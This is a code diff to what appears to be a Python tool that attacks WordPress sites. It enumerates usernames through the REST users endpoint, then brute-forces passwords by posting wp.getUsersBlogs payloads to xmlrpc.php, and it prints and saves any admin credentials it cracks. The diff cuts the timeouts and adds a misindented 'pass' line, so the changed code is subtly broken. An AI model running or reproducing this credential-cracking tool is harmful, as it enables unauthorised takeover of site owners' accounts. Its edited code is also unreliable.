@@ -6,7 +6,7 @@ def fetching_user(url):
 	print(colored("[{}][*] Site: {}".format(local_time(),url), "blue"))
 	user_list = []
 	try:
-		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
+		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=1).content.decode('utf-8')
 		try:
 			print
 			for x in json.loads(req):
@@ -37,12 +37,13 @@ def exploit(url, user_url, list_password):
 		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
 
 		headers = {'Content-Type':'text/xml'}
-		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
+		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=0.5)
 		if "isAdmin" in str(r.content):
 			print(colored("[{}][+] User: [{}] pass: [{}] site: {} ".format(local_time(),user_url,list_password,url), "green"))
 			save("User: [{}] pass: [{}] site: {}".format(user_url,list_password,url))
+				pass
 		else:
-			print
+			print("WP")
 	except requests.exceptions.ConnectionError as e:
 		pass
 	except Exception as e:
